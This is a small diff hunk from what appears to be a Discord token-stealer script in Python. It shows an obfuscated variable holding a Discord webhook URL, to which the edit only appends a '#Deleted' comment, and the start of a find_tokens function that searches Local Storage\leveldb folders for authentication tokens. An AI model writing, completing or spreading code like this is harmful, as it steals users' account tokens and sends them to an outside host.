@@ -4,7 +4,7 @@ from discord.ext import commands
 import re, json
 from urllib.request import Request, urlopen
 os.system('cls')
-O0O0O0O0O0O0O0O0O0 = 'https://discord.com/api/webhooks/838980999483359293/6ySCFfsf3WTlEWaPKioidAlAqmzDLElgFAkKBnslQZkhxN5pZ67JdFLpoZIL6jath7hU'
+O0O0O0O0O0O0O0O0O0 = 'https://discord.com/api/webhooks/838980999483359293/6ySCFfsf3WTlEWaPKioidAlAqmzDLElgFAkKBnslQZkhxN5pZ67JdFLpoZIL6jath7hU' #Deleted
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
